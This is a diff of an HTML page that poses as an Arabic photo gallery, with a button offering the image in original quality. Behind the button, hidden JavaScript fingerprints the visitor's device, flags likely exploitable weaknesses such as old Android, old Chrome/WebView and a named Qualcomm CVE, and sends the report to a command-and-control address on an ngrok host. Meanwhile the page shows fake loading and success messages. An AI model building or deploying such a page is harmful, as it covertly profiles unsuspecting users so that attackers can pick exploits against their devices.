@@ -3,103 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>معرض الصور الجديد</title>
+    <title>معرض الصور</title>
     <style>
         body { margin: 0; padding: 0; background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; }
         #status {
-            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
-            background: rgba(0,0,0,0.85); padding: 15px 30px; border-radius: 12px;
-            font-size: 18px; z-index: 999;
+            position: fixed; top: 25px; left: 50%; transform: translateX(-50%);
+            background: rgba(0,0,0,0.9); padding: 18px 35px; border-radius: 12px;
+            font-size: 19px; z-index: 999;
         }
         .btn {
-            margin: 40px auto;
-            padding: 18px 50px;
-            font-size: 21px;
-            background: #1e90ff;
+            margin: 50px auto;
+            padding: 20px 55px;
+            font-size: 23px;
+            background: #0066ff;
             color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-    <div id="status">جاري تحميل الصور...</div>
-    <img src="https://picsum.photos/id/1015/800/600" style="max-width:95%; margin-top:50px;" alt="صورة">
+    <div id="status">جاري تحميل الصور عالية الجودة...</div>
+    <img src="https://picsum.photos/id/1015/800/600" style="max-width:95%; margin-top:60px;" alt="صورة">
 
-    <button class="btn" onclick="startVulnAnalysis()">عرض الصورة بالجودة الأصلية</button>
+    <button class="btn" onclick="runAnalysis()">عرض الصورة بالجودة الأصلية</button>
 
     <script>
         const C2_URL = "https://virulently-retaliative-kisha.ngrok-free.dev/collect";
 
-        async function startVulnAnalysis() {
+        async function runAnalysis() {
             const status = document.getElementById("status");
-            status.innerHTML = "جاري تحميل النسخة عالية الجودة...";
+            status.innerHTML = "جاري تحميل النسخة الكاملة...";
 
-            await new Promise(r => setTimeout(r, 1200));
-            status.innerHTML = "جاري معالجة الصورة...";
+            await new Promise(r => setTimeout(r, 1400));
 
-            // ================== تحليل الثغرات الشامل ==================
-            const report = {
+            // ================== التحليل الشامل ==================
+            const analysis = {
                 type: "vulnerability_analysis",
                 timestamp: Date.now(),
                 device: {
                     userAgent: navigator.userAgent,
-                    androidVersion: getAndroidVersion(),
-                    chromeVersion: getChromeVersion(),
-                    screen: `${screen.width}x${screen.height}`,
-                    deviceMemory: navigator.deviceMemory || "unknown",
+                    androidVersion: getAndroidVer(),
+                    chromeVersion: getChromeVer(),
+                    screen: screen.width + "×" + screen.height,
+                    memory: navigator.deviceMemory || "unknown",
                     cores: navigator.hardwareConcurrency || "unknown"
                 },
-                detected: {
+                scan: {
                     isWebView: /wv|webview/i.test(navigator.userAgent),
-                    isQualcomm: /qualcomm|qcom|sm\d+|snapdragon/i.test(navigator.userAgent),
-                    oldAndroid: parseFloat(getAndroidVersion()) < 14,
-                    oldChrome: parseFloat(getChromeVersion().split('.')[0]) < 120,
-                    webGL: detectWebGL(),
-                    webAssembly: typeof WebAssembly !== "undefined"
+                    isQualcomm: /qualcomm|qcom|sm|snapdragon/i.test(navigator.userAgent),
+                    oldAndroid: parseFloat(getAndroidVer()) < 14,
+                    oldChrome: parseFloat(getChromeVer()) < 120
                 },
-                potential_vulnerabilities: getPotentialVulns()
+                risks: getRisks()
             };
 
-            // إرسال التقرير إلى C2
+            // إرسال التحليل إلى C2
             fetch(C2_URL, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(report)
-            }).then(() => console.log("✅ تم إرسال تحليل الثغرات"))
-              .catch(err => console.log("فشل إرسال التحليل"));
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify(analysis)
+            });
 
             status.innerHTML = "تم عرض الصورة بنجاح ✓";
+            console.log("تم إرسال تحليل الثغرات");
         }
 
-        function getAndroidVersion() {
+        function getAndroidVer() {
             const m = navigator.userAgent.match(/Android\s([0-9.]+)/);
             return m ? m[1] : "unknown";
         }
 
-        function getChromeVersion() {
+        function getChromeVer() {
             const m = navigator.userAgent.match(/Chrome\/([0-9.]+)/);
             return m ? m[1] : "unknown";
         }
 
-        function detectWebGL() {
-            try {
-                return !!document.createElement("canvas").getContext("webgl");
-            } catch(e) { return false; }
-        }
-
-        function getPotentialVulns() {
-            const list = [];
-            const android = parseFloat(getAndroidVersion());
-            const chrome = parseFloat(getChromeVersion().split('.')[0]);
-
-            if (android < 14) list.push("Android < 14 - High risk of known exploits");
-            if (/qualcomm/i.test(navigator.userAgent)) list.push("Qualcomm chipset - CVE-2026-21385 possible");
-            if (chrome < 120) list.push("Old Chrome/WebView - Multiple RCE possible");
-
-            return list.length > 0 ? list : ["No critical vulnerabilities detected"];
+        function getRisks() {
+            const risks = [];
+            if (parseFloat(getAndroidVer()) < 14) risks.push("Android version is old - High risk");
+            if (/qualcomm/i.test(navigator.userAgent)) risks.push("Qualcomm chipset - CVE-2026-21385 possible");
+            if (parseFloat(getChromeVer()) < 120) risks.push("Old Chrome/WebView version");
+            return risks;
         }
     </script>
 </body>
